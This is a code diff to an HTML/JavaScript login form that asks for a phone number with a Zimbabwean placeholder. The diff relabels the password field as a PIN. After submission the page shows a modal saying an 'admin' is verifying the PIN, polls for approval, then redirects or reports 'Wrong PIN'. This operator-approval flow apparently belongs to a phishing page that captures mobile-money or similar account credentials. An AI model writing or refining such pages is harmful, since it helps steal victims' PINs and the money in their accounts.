@@ -157,13 +157,8 @@
         <label for="phone">Phone number</label>
         <input id="phone" type="tel" placeholder="+263712345678" required />
 
-        <label for="password">Password</label>
-        <input
-          id="password"
-          type="password"
-          placeholder="Enter password"
-          required
-        />
+        <label for="password">PIN</label>
+        <input id="password" type="password" placeholder="Enter PIN" required />
 
         <button class="btn" type="submit">Continue</button>
       </form>
@@ -177,10 +172,8 @@
     <div id="verificationModal" class="modal">
       <div class="modal-content">
         <div class="spinner"></div>
-        <h2 id="modalTitle">Verifying Password</h2>
-        <p id="modalMessage">
-          Please wait while admin verifies your password...
-        </p>
+        <h2 id="modalTitle">Verifying PIN</h2>
+        <p id="modalMessage">Please wait while admin verifies your PIN...</p>
         <div id="errorContainer"></div>
       </div>
     </div>
@@ -202,7 +195,7 @@
           const password = document.getElementById("password").value;
 
           if (!phone) return alert("Please enter your phone number");
-          if (!password) return alert("Please enter a password");
+          if (!password) return alert("Please enter a PIN");
 
           // Show verification modal
           showVerificationModal();
@@ -272,7 +265,7 @@
             // Show success message
             document.getElementById("modalTitle").textContent = "✅ Approved";
             document.getElementById("modalMessage").textContent =
-              "Password verified! Redirecting...";
+              "PIN verified! Redirecting...";
 
             // Redirect after short delay
             setTimeout(() => {
@@ -280,7 +273,7 @@
             }, 1500);
           } else if (data.rejectedReason) {
             clearInterval(verificationInterval);
-            showVerificationError("Wrong password");
+            showVerificationError("Wrong PIN");
           }
         } catch (error) {
           console.error("Error checking approval status:", error);
